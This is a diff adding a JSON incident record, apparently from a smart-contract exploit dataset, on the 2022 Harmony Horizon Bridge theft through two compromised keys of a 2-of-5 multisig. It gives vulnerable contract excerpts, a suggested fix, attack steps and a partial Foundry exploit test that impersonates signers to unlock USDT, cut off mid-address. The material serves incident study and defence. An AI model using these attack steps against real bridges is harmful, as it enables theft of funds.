@@ -1,0 +1,38 @@
+{
+ "id": "2022__2022-06-23_Harmony_CompromisedMultisig",
+ "source_file": "2022/2022-06-23_Harmony_CompromisedMultisig.md",
+ "title": "Harmony Bridge — Multisig Key Compromise Analysis",
+ "date": "2022-06-23",
+ "protocol": "Harmony Horizon Bridge",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$100,000,000",
+ "loss_usd": 100000000.0,
+ "root_cause": "2 validator keys compromised from a 2/5 multisig bridge — immediate large-scale asset withdrawal",
+ "attack_tx": "0x27981c72...",
+ "vulnerable_contract": "0x715CdDa5...",
+ "classes": [
+  "private-key-compromise"
+ ],
+ "code_before": [
+  "❌ Vulnerable: 2/5 low threshold — compromising 2 keys is sufficient\ncontract MultiSigWallet {\n    uint256 public required = 2;  // ← threshold too low!\n    address[] public owners;     // 5 signers\n\n    function confirmTransaction(uint256 transactionId) public onlyOwner {\n        confirmations[transactionId][msg.sender] = true;\n        // 2 signatures allow immediate execution\n        if (isConfirmed(transactionId)) {\n            executeTransaction(transactionId);\n        }\n    }\n\n    function isConfirmed(uint256 transactionId) public view returns (bool) {\n        uint256 count = 0;\n        for (uint i = 0; i < owners.length; i++) {\n            if (confirmations[transactionId][owners[i]]) count++;\n            if (count == required) return true;  // only required=2 needs to be met\n        }\n        return false;\n    }\n}\n\n//",
+  "// ❌ Root Cause: 2 validator keys compromised from a 2/5 multisig bridge — immediate large-scale asset withdrawal\n    function addOwner(address owner)\n        public\n        onlyWallet\n        ownerDoesNotExist(owner)\n        notNull(owner)\n        validRequirement(owners.length + 1, required)\n    {\n        isOwner[owner] = true;\n        owners.push(owner);\n        emit OwnerAddition(owner);\n    }"
+ ],
+ "code_after": [
+  "✅ Fix: higher threshold + timelock\n// required = 4/5 or 3/5\n// 24-48 hour timelock on large withdrawals\n// Hardware wallet + MPC key management"
+ ],
+ "steps": [
+  "1 ► Compromised private keys of 2 signers",
+  "2 ► Called submitTransaction from attacker address:",
+  "3 ► confirmTransaction with compromised key1",
+  "→ 1/2 signatures complete",
+  "4 ► confirmTransaction with compromised key2",
+  "→ 2/2 signatures complete → immediate execution!",
+  "→ 9,981,000 USDT transferred",
+  "5 ► Repeated withdrawal pattern for ETH, BNB, etc.",
+  "6 ► Total ~$100M stolen"
+ ],
+ "other_code": [
+  "Attacker (Lazarus Group)\n ├─1─► Compromised private keys of 2 signers\n │       via spearphishing/malware targeting\n │       Harmony employees\n │\n ├─2─► Called submitTransaction from attacker address:\n │       unlockToken(USDT, 9,981,000,000, recipient)\n │\n ├─3─► confirmTransaction with compromised key1\n │       → 1/2 signatures complete\n │\n ├─4─► confirmTransaction with compromised key2\n │       → 2/2 signatures complete → immediate execution!\n │       → 9,981,000 USDT transferred\n │\n ├─5─► Repeated withdrawal pattern for ETH, BNB, etc.\n │\n └─6─► Total ~$100M stolen\n       Laundered via Tornado Cash",
+  "function testExploit() public {\n    emit log_named_uint(\"USDT before:\", usdt.balanceOf(address(this)));\n\n    // 2/5 multisig — assuming 2 signer keys have been compromised\n\n    // Submit transaction with first compromised key\n    cheat.prank(0xf845A7ee8477AD1FB4446651E548901a2635A915);\n    // unlockToken(USDT, 9981000000000, recipient) calldata\n    bytes memory _message = buildMessage(address(this));\n    uint256 txId = MultiSigWallet.submitTransaction(\n        0x2dCCDB493827E15a5dC8f8b72147E6c4A5620857,  // destination\n        0,\n        _message\n    );\n\n    // Confirm first signature\n    emit log_named_address(\n        \"First signer:\",\n        MultiSigWallet.getConfirmations(txId)[0]\n    );\n\n    // Confirm with second compromised key → immediate execution!\n    cheat.prank(0x812d8622C6F3c4"
+ ]
+}
